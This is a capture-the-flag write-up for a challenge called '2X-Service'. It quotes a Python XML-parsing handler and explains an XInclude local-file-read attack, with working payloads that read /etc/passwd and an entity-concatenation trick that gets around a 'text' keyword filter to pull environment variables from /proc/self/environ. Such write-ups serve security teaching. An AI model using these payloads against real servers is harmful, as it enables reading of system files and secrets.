# 2X-Service

{% file src="../../.gitbook/assets/app.py" %}

This challenge revolves around an XML parser:

```python
@socketio.on('message')
def handle_message(xpath, xml):
	if len(xpath) != 0 and len(xml) != 0 and "text" not in xml.lower():
		try:
			res = ''
			root = ElementTree.fromstring(xml.strip())
			ElementInclude.include(root)
			for elem in root.findall(xpath):
				if elem.text != "":
					res += elem.text + ", "
			emit('result', res[:-2])
		except Exception as e:
			emit('result', 'Nani?')
	else:
		emit('result', 'Nani?')
```

Notice that `ElementInclude.include(root)` is used, which allows [XInclude directives](https://www.w3.org/TR/xinclude/).

XInclude directives allow the parsing of files as either `text` or `xml`. For example, the following will include the contents of `/etc/passwd` as part of the results.

```markup
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
	<xi:include parse="text" href="/etc/passwd"/>
</foo>
```

However, the server checks that `"text" not in xml.lower()`. This poses a problem, because `parse="xml"` will raise an error when used with non-XML content like `/etc/passwd`. To get around this, we can simply define XML entities, then combine them to form the string `text`:

```markup
<!DOCTYPE data [
	<!ENTITY a0 "te" >
	<!ENTITY a1 "xt" >
]>
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
	<xi:include parse="&a0;&a1;" href="/etc/passwd"/>
</foo>
```

The flag was in the environment variable, so we read `/proc/self/environ` to get

`FLAG=TetCTF{Just_Warm_y0u_uP_:P__}`
